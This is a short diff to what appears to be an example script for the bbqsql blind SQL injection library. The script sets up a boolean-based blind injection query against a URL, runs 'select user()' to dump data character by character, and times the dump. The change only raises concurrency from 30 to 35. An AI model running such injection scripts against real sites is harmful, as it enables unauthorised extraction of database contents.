@@ -23,7 +23,7 @@ query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}
 bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code')
 
 start = time()
-results = bh.run(query="select user()",concurrency=30)
+results = bh.run(query="select user()",concurrency=35)
 stop = time()
 
 print "dumped db in %f seconds" % (stop-start)
